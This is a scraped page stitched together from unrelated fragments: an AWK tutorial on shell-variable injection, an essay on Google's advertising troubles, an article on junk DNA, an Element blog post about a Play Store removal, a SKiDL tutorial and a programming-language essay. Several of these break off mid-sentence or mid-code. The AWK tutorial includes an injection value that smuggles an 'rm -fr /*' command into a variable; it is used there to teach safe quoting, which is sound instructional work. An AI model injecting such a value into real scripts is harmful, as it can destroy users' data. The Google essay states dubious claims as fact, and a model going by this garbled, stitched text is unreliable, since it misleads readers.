<h2>Easy: Fixed data</h2>

<p>Embedded AWK programs in shell scripts work great when you already know
<em>before</em> runtime what you want your patterns for the pattern-action pairs to
be.  Suppose our company has a vendor-supplied program that returns temperature
sensor data for the server room, and we want to run some commands for any and
all rows registering over a certain threshold temperature.  The output for the
existing <code>server-room-temps</code> command might look like this:</p>

<pre><code>$ server-room-temps
ID  Location    Temperature_C
1   hot_aisle_1 27.9
2   hot_aisle_2 30.3
3   cold_aisle_1    26.0
4   cold_aisle_2    25.2
5   outer       23.9
</code></pre>

<p>The task for the monitoring script is simple: get a list of all the locations
where the temperature is above 28°C.  If there are any such locations, we need
to email the administrator the full list.  Easy!  It looks like every
introductory AWK example you’ve ever seen—it could be straight out of <a href="https://www.amazon.com/AWK-Programming-Language-Alfred-Aho/dp/020107981X">the
book</a>.  Let’s type it up on the shell to test it:</p>

<pre><code>$ server-room-temps | awk 'NR &gt; 1 &amp;&amp; $3 &gt; 28 {print $2}'
hot_aisle_2
</code></pre>

<p>That looks good.  The script might end up looking something like this:</p>

<pre><code>#!/bin/sh
alerts=/var/cache/temps/alerts
server-room-temps |
    awk 'NR &gt; 1 &amp;&amp; $3 &gt; 28 {print $2}' &gt; "$alerts" || exit
if [ -s "$alerts" ] ; then
    mail -s 'Temperature alert' sysadmin &lt; "$alerts"
fi
</code></pre>

<p>So, after writing the alerts data file, we test if with <code>[ -s ... ]</code> to see
whether it’s got any data in it.  If it does, we send it all to the
administrator with <code>mail(1)</code>.  Done!</p>

<p>We set that running every few minutes with <code>cron(8)</code> or <code>systemd.timer(5)</code>, and
we have a nice stop-gap solution until the lazy systems administrator gets
around to fixing the Nagios server.  He’s probably just off playing
<a href="https://www.adom.de/home/index.html">ADOM</a> again…</p>

<h2>Hard: runtime data</h2>

<p>A few weeks later, our sysadmin still hasn’t got the Nagios server running,
because his high elf wizard is about to hit level 50, and there’s a new request
from the boss: can we adjust the script so that it accepts the cutoff
temperature data as an argument, and other departments can use it?  Sure, why
not.  Let’s mock that up, with a threshold of, let’s say, 25.5°C.</p>

<pre><code>$ server-room-temps &gt; test-data
$ threshold=25.5
$ awk 'NR &gt; 1 &amp;&amp; $3 &gt; $threshold {print $2}' test-data
hot_aisle_1
hot_aisle_2
</code></pre>

<p>Wait, that’s not right.  There are <em>three</em> lines with temperatures over 25.5°C,
not two.  Where’s <code>cold_aisle_1</code>?</p>

<p>Looking at the code more carefully, you realize that you assumed your shell
variable would be accessible from within the AWK program, when of course, it
isn’t; AWK’s variables are independent of shell variables.  You don’t know why
the hell it’s showing those two rows, though…</p>

<p>Maybe we need double quotes?</p>

<pre><code>$ awk "NR &gt; 1 &amp;&amp; $3 &gt; $threshold {print $2}" test-data
awk: cmd. line:1: NR &gt; 1 &amp;&amp;  &gt; 25.5 {print}
awk: cmd. line:1:            ^ syntax error
</code></pre>

<p>Hmm.  Nope.  Maybe we need to expand the variable inside the quotes?</p>

<pre><code>$ awk 'NR &gt; 1 &amp;&amp; $3 &gt; "$threshold" {print $2}' test-data
hot-aisle-1
hot-aisle-2
cold-aisle-1
cold-aisle-2
outer
</code></pre>

<p>That’s not right, either.  It seems to have printed <em>all</em> the locations, as if
it didn’t test the threshold at all.</p>

<p>Maybe it should be <em>outside</em> the single quotes?</p>

<pre><code>$ awk 'NR &gt; 1 &amp;&amp; $3 &gt; '$threshold' {print $2}' test-data
hot-aisle-1
hot-aisle-2
cold-aisle-1
</code></pre>

<p>The results look right, now … ah, but wait, we still need to <a href="https://mywiki.wooledge.org/Quotes">quote it to
stop spaces expanding</a>…</p>

<pre><code>$ awk 'NR &gt; 1 &amp;&amp; $3 &gt; '"$threshold"' {print $2}' test-data
hot-aisle-1
hot-aisle-2
cold-aisle-1
</code></pre>

<p>Cool, that works.  Let’s submit it to the security team and go to lunch.</p>

<h3>Caught out</h3>

<p>To your surprise, the script is rejected.  The security officer says you have
an unescaped variable that allows arbitrary code execution.  What?  Where?
It’s just AWK, not SQL…!</p>

<p>To your horror, the security officer demonstrates:</p>

<pre><code>$ threshold='0;{system("echo rm -fr /*");exit}'
$ echo 'NR &gt; 1 &amp;&amp; $3 &gt; '"$threshold"' {print $2}'
NR &gt; 1 &amp;&amp; $3 &gt; 0;{system("echo rm -fr /*");exit} {print $2}
$ awk 'NR &gt; 1 &amp;&amp; $3 &gt; '"$threshold"' {print $2}' test-data
rm -fr /bin /boot /dev /etc /home /initrd.img ...
</code></pre>

<p>Oh, hell… if that were installed, and someone were able to set <code>threshold</code> to
an arbitrary value, they could execute <em>any</em> AWK code, and thereby shell
script, that they wanted to.  It’s <em>AWK injection</em>!  How embarrassing—good
thing that was never going to run as <code>root</code> (…right?)  Back to the drawing
board …</p>

<h3>Validating the data</h3>

<p>One approach that might come readily to mind is to ensure that no unexpected
characters appear in the value.  We could use a <code>case</code> statement before
interpolating the variable into the AWK program to check it contains no
characters outside digits and a decimal:</p>

<pre><code>case $threshold in
    *[!0-9.]*) exit 2 ;;
esac
</code></pre>

<p>That works just fine, and it’s appropriate to do some data validation at the
opening of the script, anyway.  It’s certainly better than leaving it as it
was.  But we <a href="https://en.wikipedia.org/wiki/SQL_injection">learned this lesson</a> with PHP in the 90s; you don’t just
filter on characters, or slap in some backslashes—that’s missing the point.
Ideally, we need to safely pass the data into the AWK process <em>without</em> ever
parsing it as AWK code, sanitized or nay, so the situation doesn’t arise in the
first place.</p>

<h3>Environment variables</h3>

<p>The shell and your embedded AWK program may not share the shell’s local
variables, but they <em>do</em> share environment variables, accessible in AWK’s
<code>ENVIRON</code> array.  So, passing the threshold in as an environment variable
works:</p>

<pre><code>$ THRESHOLD=25.5
$ export THRESHOLD
$ awk 'NR &gt; 1 &amp;&amp; $3 &gt; ENVIRON["THRESHOLD"] {print $2}' test-data
hot-aisle-1
hot-aisle-2
cold-aisle-1
</code></pre>

<p>Or, to be a little cleaner:</p>

<pre><code>$ THRESHOLD=25.5 \
    awk 'NR &gt; 1 &amp;&amp; $3 &gt; ENVIRON["THRESHOLD"] {print $2}' test-data
hot-aisle-1
hot-aisle-2
cold-aisle-1
</code></pre>

<p>This is already much better.  AWK will parse our data <em>only</em> as a variable, and
won’t try to execute anything within it.  The only snag with this method is
picking a name; make sure that you don’t overwrite another, more important
environment variable, like <code>PATH</code>, or <code>LANG</code>…</p>

<h3>Another argument</h3>

<p>Passing the data as another <em>argument</em> and then reading it out of the <code>ARGV</code>
array works, too:</p>

<pre><code>$ awk 'BEGIN{ARGC--} NR &gt; 1 &amp;&amp; $3 &gt; ARGV[2] {print $2}' test-data 25.5
</code></pre>

<p>This method is also safe from arbitrary code execution, but it’s still somewhat
awkward because it requires us to decrease the argument count <code>ARGC</code> by one so
that AWK doesn’t try to process a file named “25.5” and end up upset when it’s
not there.  AWK arguments can mean whatever you need them to mean, but unless
told otherwise, AWK generally assumes they are filenames, and will attempt to
iterate through them for lines of data to chew on.</p>

<p>Here’s another way that’s very similar; we read the threshold from the second
argument, and then blank it out in the <code>ARGV</code> array:</p>

<pre><code>$ awk 'BEGIN{threshold=ARGV[2];ARGV[2]=""}
    NR &gt; 1 &amp;&amp; $3 &gt; threshold {print $2}' test-data 25.5
</code></pre>

<p>AWK won’t treat the second argument as a filename, because it’s blank by the
time it processes it.</p>

<h3>Pre-assigned variables</h3>

<p>There are two lesser-known syntaxes for passing data into AWK that allow you
safely to assign variables at runtime.  The first is to use the <code>-v</code> option:</p>

<pre><code>$ awk -v threshold="$threshold" \
    'NR &gt; 1 &amp;&amp; $3 &gt; threshold {print $2}' \
    test-data
</code></pre>

<p>Another, perhaps even more obscure, is to set them as arguments before the
filename data, using the <code>var=value</code> syntax:</p>

<pre><code>$ awk 'NR &gt; 1 &amp;&amp; $3 &gt; threshold {print $2}' \
    threshold="$threshold" test-data
</code></pre>

<p>Note that in both cases, we still <em>quote</em> the <code>$threshold</code> expansion; this is
because the shell is expanding the value before we pass it in.</p>

<p>The difference between these two syntaxes is when the variable assignment
occurs.  With <code>-v</code>, the assignment happens straight away, before reading any
data from the input sources, as if it were in the <code>BEGIN</code> block of the program.
With the argument form, it happens when the program’s data processing reaches
that argument.  The upshot of that is that you could test several files with
several different temperatures in one hit, if you wanted to:</p>

<pre><code>$ awk 'NR &gt; 1 &amp;&amp; $3 &gt; threshold {print $2}' \

<p>Both of these assignment syntaxes are standardized in <a href="https://www.man7.org/linux/man-pages/man1/awk.1p.html">POSIX <code>awk</code></a>.</p>

<p>These are my preferred methods for passing runtime data; they require no
argument count munging, avoid the possibility of trampling on existing
environment variables, use AWK’s own variable and expression syntax, and most
importantly, the chances of anyone reading the script being able to grasp
what’s going on are higher.  You can thereby avoid a mess of quoting and
back-ticking that often plagues these sorts of embedded programs.</p>

But even with a <a href="http://www.huffingtonpost.com/2013/03/21/youtube-stats_n_2922543.html" target="_blank" rel="noopener" data-href="http://www.huffingtonpost.com/2013/03/21/youtube-stats_n_2922543.html">sixth of the world</a> visiting this video-sharing behemoth every month, YouTube <a href="https://www.wsj.com/articles/viewers-dont-add-up-to-profit-for-youtube-1424897967" target="_blank" rel="noopener" data-href="https://www.wsj.com/articles/viewers-dont-add-up-to-profit-for-youtube-1424897967">never became profitable</a>. In an attempt to combat the effect of ad blockers, YouTube launched an ad-free subscription model in late 2015, but the subscription numbers were <a href="https://www.theverge.com/2016/11/2/13498470/youtube-red-subscribers-video-content-music" target="_blank" rel="noopener" data-href="http://www.theverge.com/2016/11/2/13498470/youtube-red-subscribers-video-content-music">underwhelming</a>.</p><p id="7afb">YouTube’s already insurmountable problems multiplied in early 2017 as advertisers <a href="http://www.fiercepharma.com/marketing/google-scrambling-for-solutions-after-advertiser-departures-youtube" target="_blank" rel="noopener" data-href="http://www.fiercepharma.com/marketing/google-scrambling-for-solutions-after-advertiser-departures-youtube">began to pull out amid ad placement controversies</a>, and huge revenue generators began to <a href="http://www.ibtimes.com/pewdiepie-starts-weekly-twitch-show-uploads-youtube-over-party-video-2523797" target="_blank" rel="noopener" data-href="http://www.ibtimes.com/pewdiepie-starts-weekly-twitch-show-uploads-youtube-over-party-video-2523797">leave the site</a>.</p><p id="f0ab">Even those who weren’t blocking ads had trained themselves to ignore them entirely. Researchers dubbed this phenomenon “<a href="http://www.tobiipro.com/fields-of-use/marketing-consumer-research/advertising/" target="_blank" rel="noopener" data-href="http://www.tobiipro.com/fields-of-use/marketing-consumer-research/advertising/">banner blindness</a>”.

These figures painted a pretty grim picture for the sustainability of online advertising, but especially for Google’s position within the industry.</p><blockquote id="8a50"><p>Google’s mighty engine had started to&nbsp;sputter.</p></blockquote><h3 id="def0">A chance to pivot, and how Google missed&nbsp;it</h3><p id="ec19">If losing a major portion of their audience and annoying the rest wasn’t bad enough, Google also failed to get ahead of one of the biggest shifts in technology’s history. They recognized the importance of artificial intelligence but their approach missed the mark. Since Google’s search pillar had become unstable, a lot was riding on the company’s strategy for artificial intelligence.</p><blockquote id="2408"><p>“We will move from mobile first to an AI first&nbsp;world.”</p></blockquote><p id="814d">Google’s then-CEO Sundar Pichai <a href="https://blog.google/topics/inside-google/this-years-founders-letter/" target="_blank" rel="noopener" data-href="https://blog.google/topics/inside-google/this-years-founders-letter/">famously predicted</a> in 2016 that “<em>the next big step will be for the very concept of the ‘device’ to fade away” </em>and that<em> “over time, the computer itself — whatever its form factor — will be an intelligent assistant helping you through your day. We will move from mobile first to an AI first world.”</em></p><p id="6d2f">Google’s ability to acknowledge the coming trend and still fail to land in front of it reminded many observers of its catastrophic failures in the booming industries of social media and instant messaging.</p><figure id="179f"><div></div><figcaption>Sundar Pichai wondering how to monetize a virtual assistant</figcaption></figure><h3 id="deb3">Google vs.&nbsp;Amazon</h3><p id="d2e7">Meanwhile, in 2014, Amazon released a product called Amazon Echo, a small speaker that could sit in your home and answer questions, perform tasks, and buy things online for you. The Echo was a <a href="http://www.businessinsider.com/amazon-echo-success-could-spell-big-trouble-for-google-2017-1" target="_blank" rel="noopener" data-href="http://www.businessinsider.com/amazon-echo-success-could-spell-big-trouble-for-google-2017-1">smash success</a>. Google released its copycat product, Google Home, two years later, but it was already <a href="https://www.theguardian.com/technology/2017/jan/22/home-battleground-amazon-google-voice-technology" target="_blank" rel="noopener" data-href="https://www.theguardian.com/technology/2017/jan/22/home-battleground-amazon-google-voice-technology">too late to catch up</a>, and had no clear revenue strategy.</p><p id="a3f9">Alexa — the assistant that lived inside the Echo — on the other hand, was quickly integrated into several products and services, and its monetization model was clear, viable, and most importantly future-friendly. The Echo made it easy to order products through Amazon, and every time someone used an Echo to purchase something, Amazon made money.</p><p id="dde3">Google extended the reach of their virtual assistant by building it into Android, but doing so still didn’t provide an answer for how the technology would generate enough revenue to sustain Google’s expanding repertoire of expensive innovations.</p><p id="c590">Google’s ads relied on screens, yet voice interaction subverted screens entirely. Google briefly tried playing audio ads with the Google Home, but consumers were <a href="https://www.engadget.com/2017/03/17/google-home-ads-bad-precedent/" target="_blank" rel="noopener" data-href="https://www.engadget.com/2017/03/17/google-home-ads-bad-precedent/">far from receptive</a>.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-yui_3_17_2_1_1565793939038_266584"><div><p>The human genome is an incredible thing. Six billion letters of DNA – that’s more than two metres of DNA in every single cell – containing all the genes that enable a single cell to grow into a fully-formed, fully functioning person. </p><p>So when the first draft sequence of the human genome was published in 2001, researchers around the world were eager to discover exactly how many genes must be packed into our glorious genome.</p><p>The answer was a big surprise.</p><p>Many people thought that it must take at least a hundred thousand genes to make a human – with a sweepstake on offer to the person who made the closest guess to the final number – yet the human genome turns out to contain only 20,000 or so genes (roughly the same number of genes as a fruit fly or nematode worm).</p><p>This seems remarkably low to make an organism with as much dazzling complexity as a human being.  Even more perplexingly, the genes that we do have make up less than two per cent of all that DNA. So what’s the rest?</p><p>To find out, we need to go back in time to 1972.</p><p>That’s when geneticist Susumu Ohno published a paper entitled “So much ‘junk’ DNA in our genome” in an obscure scientific journal, the Brookhaven Symposia in Biology, in which he mused upon a mathematical problem.</p><p>By that point, scientists had already measured how much DNA was present in bacteria and figured out that these little bugs must contain a few thousand genes. They also knew that a single human cell contained at least 750 times as much DNA.</p><p>Ohno did a quick back-of-the-envelope calculation – if the number of genes in any genome was directly proportional to the amount of DNA, then humans should have….. three million genes, more or less.</p><p>But, as he pointed out in his paper, ‘lowly lungfish and salamanders’ can have 36 times more DNA in their cells than is present in ours, suggesting that they should have…. A hundred million genes.</p><p>He didn’t believe it. What would a slimy salamander need with all those genes? Therefore, Ohno concluded, the vast majority of the human genome must be junk. And, correspondingly, varying proportions of other organisms’ genomes must be junk too. And once the Human Genome project revealed that the vast majority of our genome doesn’t seem to contain actual genes, it looked like he was right.</p><p>The function of this remaining 98% of the human genome - sometimes called ‘junk DNA’ but more accurately referred to as non-coding DNA – is a hotly debated topic in the world of genetics, fought out within the dignified pages of journals and the more febrile atmosphere of scientific conferences.</p><p>An absolutely massive study published in 2012, known as ENCODE, suggested that around 80% of the human genome was functional – namely, that it did something important for the proper functioning of our cells and bodies. Just under 10 per cent is thought to be control switches responsible for turning genes on and off at the right time and in the right place, while the rest does all manner of things, from producing little pieces of RNA that control gene activity to organising the three-dimensional structure of the DNA inside a cell.</p><p>Others were unconvinced. For example, evolutionary geneticist Chris Ponting suggests that less than 10% of the human genome is functional, based on how much has been strongly preserved through evolutionary time and must therefore be very important.</p><p>It’s against this backdrop we bring in the Onion Test, devised by T. Ryan Gregory and posted on his blog in April 2007. It was later formalised as a scientific paper that he published in 2014, together with Alexander Palazzo.</p><p>Put simply, the Onion Test goes like this.</p><p>The onion in your vegetable drawer has five times more DNA than humans. So if you’re a researcher who thinks that non-coding DNA has a particular function in the genome, can you explain why an onion needs about five times more of it than a human to do the same thing?</p><p>Unpeeling this idea a bit further, Gregory points out that some species of onions have around double the amount of DNA as your regular onions, while others have less than half. Yet they’re pretty much the same and have the same number of genes, so why would they need double or half the amount of non-coding DNA?</p><p>This argument works for all kinds of species, from Ohno’s lowly salamanders with their giant genomes containing roughly the same set of genes as other vertebrates, including humans, to the biggest genome discovered to date, which belongs to the Japanese canopy flower, Paris Japonica, with around 150 time more DNA in its genome than a human.</p><p>Then there’s the poisonous Fugu pufferfish – often eaten (very carefully!) as a delicacy in Japan.  They have remarkably compact genomes, roughly an eighth of the size of our own yet containing almost exactly the same repertoire of genes and very little junk.</p><p>Perhaps our obsession with finding function for all the junk in our genome comes from a desire to think that humans are something special in the biological world – certainly more special than an onion.</p><p> But in the words of the grumpy geneticist Dan Graur, who I interviewed for my book Herding Hemingway’s Cats in which I dig into the junk in our genetic trunk,  “Either you have to assume that humans are the pinnacle of creation –that everything is functional and those organisms with more DNA than us have junk DNA but we don’t. Or you have to assume that humans are a regular organism that has junk DNA just like everything else.”</p><p><strong>Further reading:</strong></p><ul data-rte-list="default"><li><p><a href="http://www.genomicron.evolverzone.com/2007/04/onion-test/" target="_blank">T.

      <div><p>Hi all,</p><p>At 2021-01-29 at 21:35 UTC Google suspended Element from the Play Store without warning or notification. &nbsp;We submitted an appeal asking for clarification at 23:18, and at 05:31 received a generic update from the Google Play Policy team citing that the app has been removed due to content which contravenes their terms of use, and asking us to “make the necessary changes to [our] app” and “upload a new app using a new package name and a new app name”.</p><p>As of 11:44 UTC we’ve submitted a detailed appeal to reiterate that Element is a generic chat app for connecting to the global Matrix communication network, just as Chrome is a generic web browser for connecting to the Web - and just as Google does not control the content on the Web, Element does not control the content on Matrix.</p><p>We have also explained that the Matrix servers that we <em>do</em> run as Element (including the default Matrix.org homeserver, which we run on behalf of <a href="https://matrix.org/foundation">The Matrix.org Foundation</a>) have <a href="https://matrix.org/legal/terms-and-conditions#6-play-nice-clauses">strict Terms of Use</a> which we actively enforce. We abhor abuse, and Element is not an app that caters to abusive content.</p><p>In order to enforce our terms of use on the Matrix servers we run as Element, we have a formal Trust and Safety team hired full-time who are dedicated to investigating and tracking abuse reports sent to <a href="https://element.io/cdn-cgi/l/email-protection#e48586919781a4898590968d9cca8b9683"><span data-cfemail="d3b2b1a6a0b693beb2a7a1baabfdbca1b4">[email&nbsp;protected]</span></a> or reported from the app. &nbsp;The team takes appropriate action on a ticket by ticket basis - deactivating abusive accounts and blocking chatrooms from our servers which contravene our terms of use, and building tooling to help enforce the terms of use on the servers we run.</p><p>Managing abuse is an ongoing activity, and <a href="https://sifted.eu/articles/element-whatsapp-exodus/">Matrix is expanding massively at the moment</a>. We are expanding Element’s Trust and Safety team to match that growth, focusing on improving our anti-abuse mechanisms, and we are also constantly expanding the <a href="https://matrix.org/docs/guides/moderation/">moderation tools</a> we provide to the community.</p><p>Meanwhile, we’re also continuing to work on decentralised reputation as a <a href="https://matrix.org/blog/2020/10/19/combating-abuse-in-matrix-without-backdoors/">scalable solution to empower other users to combat abuse</a> for the wider Matrix network - effectively bringing control back to users and empowering communities to remain safe online.</p><p>Element and Matrix are used by the French, German, UK and US governments, <a href="https://matrix.org/blog/2021/01/29/this-week-in-matrix-2021-01-29#dept-of-status-of-matrix-%EF%B8%8F">countless universities</a>, thousands of businesses and millions of people across the world - we can only apologise for the disruption caused by the app disappearing like this.</p><p>We’re currently waiting for an update to Google and will keep this blog post updated as the situation develops. &nbsp;We look forward to resolving the problem and getting the app back in the store shortly.</p><p>-- The Element Team</p><p>Update: reminder that in the interim you can download a (slightly outdated) version of Element Android from F-Droid at <a href="https://f-droid.org/en/packages/im.vector.app/">https://f-droid.org/en/packages/im.vector.app</a>. &nbsp;We're also looking into running our own F-Droid repository going forwards so the most recent build is always available there.</p><p>UPDATE: At 2021-01-30 23:17 UTC we received a call from a VP at Google who apologised for the bad communication from Google and explained the situation, which related to some extremely abusive content which was accessible on the default matrix.org homeserver. &nbsp;Our Trust and Safety team had already identified and acted on this content to enforce the server's terms of use, and so we've explained how Element and Matrix works, established a channel for communication over any future moderation concerns, and expect the app to be restored shortly.</p><p>UPDATE: The app is restored as of 2021-01-31 00:30 UTC. &nbsp;Huge thanks to everyone for your patience and support while we sorted this out, and to the wider Element team who spent their Saturday on this. &nbsp;Thanks also to Google for being transparent and apologetic and the rapid resolution once we'd established contact.</p></div>

<p><strong>Never use a lousy schematic editor again!</strong>
SKiDL is a simple module that lets you describe electronic circuits using Python.
The resulting Python program outputs a netlist that a PCB layout tool uses to
create a finished circuit board.</p>

<p>SKiDL is a module that allows you to compactly describe the interconnection of 
electronic circuits and components using Python.
The resulting Python program performs electrical rules checking
for common mistakes and outputs a netlist that serves as input to
a PCB layout tool.</p>

<p>First, let’s look at a “normal” design flow in <a href="https://kicad-pcb.org/">KiCad</a>:</p>

<p><img src="https://xesscorp.github.io/skidl/docs/_site/images/schematic-process-flow.png" alt="Schematic-based PCB design flow"></p>

<p>Here, you start off in a <em>schematic editor</em> (for KiCad, that’s EESCHEMA) and
draw a schematic. From that, EESCHEMA generates
a <em>netlist file</em> that lists what components are used and how their pins are interconnected.
Then you’ll use a <em>PCB layout tool</em> (like KiCad’s PCBNEW) to arrange the part footprints
and draw the wire traces that connect the pins as specified in the netlist.
Once that is done, PCBNEW outputs a set of <em>Gerber files</em> that are sent to a
<em>PCB fabricator</em> who will create a physical PCB and ship it to you.
Then you’ll post a picture of them on Twitter and promptly dump them
in a drawer for a few years because you got bored with the project.</p>

<p>In the SKiDL-based design flow, you use a <em>text editor</em> to create a <em>Python code file</em>
that employs the SKiDL library to describe interconnections of components.
This code file is executed by a <em>Python interpreter</em> and a netlist file is output.
From there, the design flow is identical to the schematic-based one
(including dumping the PCBs in a drawer).</p>

<p><img src="https://xesscorp.github.io/skidl/docs/_site/images/skidl-process-flow.png" alt="Schematic-based PCB design flow"></p>

<p>So, why would you <em>want</em> to use SKiDL?
Here are some of the features SKiDL brings to electronic design:</p>

<ul>
  <li>Requires only a text editor and Python.</li>
  <li>Has a powerful, flexible syntax (because it <em>is</em> Python).</li>
  <li>Permits compact descriptions of electronic circuits (think about <em>not</em> tracing
signals through a multi-page schematic).</li>
  <li>Allows textual descriptions of electronic circuits (think about using 
<code>diff</code> and <a href="https://en.wikipedia.org/wiki/Git">git</a> for circuits).</li>
  <li>Performs electrical rules checking (ERC) for common mistakes (e.g., unconnected device I/O pins).</li>
  <li>Supports linear / hierarchical / mixed descriptions of electronic designs.</li>
  <li>Fosters design reuse (think about using <a href="https://xesscorp.github.io/skidl/docs/_site/pypi.org">PyPi</a> and <a href="https://xesscorp.github.io/skidl/docs/_site/github.com">Github</a>
to distribute electronic designs).</li>
  <li>Makes possible the creation of <em>smart circuit modules</em> whose behavior / structure are changed parametrically
(think about filters whose component values are automatically adjusted based on your
desired cutoff frequency).</li>
  <li>Can work with any ECAD tool (only two methods are needed: one for reading the part libraries and another
for outputing the correct netlist format).</li>
  <li>Takes advantage of all the benefits of the Python ecosystem (because it <em>is</em> Python).</li>
  <li>Free software: MIT license.</li>
  <li>Open source: <a href="https://github.com/xesscorp/skidl">https://github.com/xesscorp/skidl</a></li>
</ul>

<p>As a very simple example, the SKiDL program below describes a circuit that
takes an input voltage, divides it by three, and outputs it:</p>

<div><div><pre><code><span>from</span> <span>skidl</span> <span>import</span> <span>*</span>

<span># Create input &amp; output voltages and ground reference.
</span><span>vin</span><span>,</span> <span>vout</span><span>,</span> <span>gnd</span> <span>=</span> <span>Net</span><span>(</span><span>'VI'</span><span>),</span> <span>Net</span><span>(</span><span>'VO'</span><span>),</span> <span>Net</span><span>(</span><span>'GND'</span><span>)</span>

<span># Create two resistors.
</span><span>r1</span><span>,</span> <span>r2</span> <span>=</span> <span>2</span> <span>*</span> <span>Part</span><span>(</span><span>"Device"</span><span>,</span> <span>'R'</span><span>,</span> <span>TEMPLATE</span><span>,</span> <span>footprint</span><span>=</span><span>'Resistor_SMD.pretty:R_0805_2012Metric'</span><span>)</span>
<span>r1</span><span>.</span><span>value</span> <span>=</span> <span>'1K'</span>   <span># Set upper resistor value.
</span><span>r2</span><span>.</span><span>value</span> <span>=</span> <span>'500'</span>  <span># Set lower resistor value.
</span>
<span># Connect the nets and resistors.
</span><span>vin</span> <span>+=</span> <span>r1</span><span>[</span><span>1</span><span>]</span>      <span># Connect the input to the upper resistor.
</span><span>gnd</span> <span>+=</span> <span>r2</span><span>[</span><span>2</span><span>]</span>      <span># Connect the lower resistor to ground.
</span><span>vout</span> <span>+=</span> <span>r1</span><span>[</span><span>2</span><span>],</span> <span>r2</span><span>[</span><span>1</span><span>]</span> <span># Output comes from the connection of the two resistors.
</span>
<span># Or you could do it with a single line of code:
# vin &amp;&amp; r1 &amp;&amp; vout &amp;&amp; r2 &amp;&amp; gnd
</span>
<span># Output the netlist to a file.
</span><span>generate_netlist</span><span>()</span>
</code></pre></div></div>

<p>And this is the netlist output that is passed to <code>PCBNEW</code> to
do the PCB layout:</p>

<p>SKiDL is pure Python so it’s easy to install:</p>



<p>To give SKiDL some part libraries to work with,
you’ll also need to install <a href="http://kicad-pcb.org/">KiCad</a>.
Then, you’ll need to set an environment variable so SKiDL can find the libraries.
For Windows, do this:</p>

<div><div><pre><code>set KICAD_SYMBOL_DIR=C:\Program Files\KiCad\share\kicad\kicad-symbols
</code></pre></div></div>

<p>And for linux-type OSes, define the environment variable in your <code>.bashrc</code> like so:</p>

<div><div><pre><code>export KICAD_SYMBOL_DIR="/Library/Application Support/kicad/kicad-symbols"
</code></pre></div></div>

<p><strong>These paths are OS-dependent</strong>, so launch KiCAD and click <code>Preferences-&gt;Configure Paths</code>
to reveal the needed paths.</p>



<p>This is the minimum that you need to know to design electronic circuitry
using SKiDL:</p>

<ul>
  <li>How to get access to SKiDL.</li>
  <li>How to find and instantiate a component (or <em>part</em>).</li>
  <li>How to connect <em>pins</em> of the parts to each other using <em>nets</em>.</li>
  <li>How to run an ERC on the circuit.</li>
  <li>How to generate a <em>netlist</em> for the circuit that serves as input to a PCB layout tool.</li>
</ul>

<p>I’ll demonstrate these steps using SKiDL in an interactive Python session,
but normally the statements that are shown would be entered into a file and
executed as a Python script.</p>

<h2 id="accessing-skidl">Accessing SKiDL</h2>

<p>To use skidl in a project, just place the following at the top of your file:</p>



<p>But for this tutorial, I’ll just import everything:</p>



<h2 id="finding-parts">Finding Parts</h2>

<h3 id="command-line-searching">Command-line Searching</h3>

<p>SKiDL provides a convenience function for searching for parts called
(naturally) <code>search</code>.
For example, if you needed an operational amplifier, then the following command would
pull up some likely candidates:</p>

  </p>


<p>A great deal of effort has been expended on figuring out what makes a
programming language “good” (or, more accurately, <em>popular</em>).</p>

<p>What I’m about to propose is really just conjecture, but I think the conclusions
drawable from it are amusingly accurate.</p>

<h2 id="the-theory">The Theory</h2>

<p><em>The popularity of a given programming language can be described accurately
as if the language were a file on a Unix filesystem, with <strong>read</strong>, <strong>write</strong>,
and <strong>execute</strong> bits. A language with all three “bits” set is more likely to
be popular than a language with two or less.</em></p>

<p>That alone is fairly meaningless, so I’ll detail exactly what is meant by
“readability”, “writability”, and “executability”.</p>

<h2 id="readability">Readability</h2>

<p>What does it mean for a programming language to be readable? That’s an
inflammatory question.</p>

<p>At the risk of being overly simplistic and broad, I’ll say that a language’s
readability is largely a function of 3 characteristics:</p>

<h3 id="similarity-to-other-popular-languages-or-overall-styles">Similarity to other popular languages, or overall styles.</h3>

<p>To a certain extent, this characteristic can be simplified to a single question:</p>

<p><em>“How similar is it to C?”</em></p>

<p>For the last 50 years, the vast majority of programming has been done
in procedural fashion, in languages with syntaxes directly derived from
or heavily inspired by ALGOL and C. Even languages that aren’t directly
procedural (read: anything remotely object-oriented) regularly borrow
constructions from their ALGOL-derived cousins.</p>

<p>This doesn’t mean that ALGOL-like syntaxes are objectively <em>good</em>, just that
their universal familiarity has a tangible effect on how we approach <em>new</em>
languages.</p>

<p>For example, how do you feel about these function calling syntaxes?</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
</pre></td><td><pre>(1): foo(bar, baz, quux)
(2): foo bar baz quux
(3): foo bar withBaz: baz withQuux: quux
(4): [quux;baz;bar | foo]
</pre></td></tr></tbody></table></code></pre></div></div>

<p>If you’re like me, <code>(1)</code> is the most immediately understandable - it’s standard
function-with-arguments-separated-by-commas-in-parentheses-style. <code>(2)</code> might
also be fairly recognizable, if you’re used to working in a shell - it’s
utility-with-stringy-arguments-separated-by-whitespace-style. <code>(3)</code> will feel
familiar to Smalltalk programmers - the
receiver-object-taking-a-message-and-keyword-arguments-style. Finally, <code>(4)</code>
should feel relatively foreign to everybody - the argument list is reversed to
reflect the structure of the stack.</p>

<p>Without getting into which one of these styles is objectively best (I wouldn’t
be able to tell you), it’s apparent to most people that <code>(1)</code> is the most
<em>readable</em> simply by virtue of being so common. If I see <code>foo(bar, baz, quux)</code>
in a language I’ve never used before, I can be <em>relatively</em> confident that it
will behave like the other languages I’ve seen it in. The principle would be
the same, even if we lived in a world where Smalltalk or Lisp styles were
overwhelmingly popular.</p>

<h3 id="apparent-meaning">Apparent meaning.</h3>

<p>If you had (or have) never written a line of code in your life, which one of
these lines is most apparent in meaning? It’s okay if neither is apparent:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
</pre></td><td><pre>(1): foobar[0]
(2): foobar.first
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Although <code>(1)</code> is what I learned first and is significantly more common, I find
<code>(2)</code> much more apparent. Compared to <code>(1)</code>, which requires that I know that
arrays are (usually) zero-based and accessed with <code>[]</code>, <code>(2)</code> only requires
that I recognize what I want (getting the first element of <code>foobar</code>) and
the general pattern for “doing things” from the line’s surroundings (calling a
method on an object with <code>.</code>).</p>

<p>What about this pair?</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
</pre></td><td><pre>(1): foo = bar * baz + quux
(2): = foo + * bar baz quux
</pre></td></tr></tbody></table></code></pre></div></div>

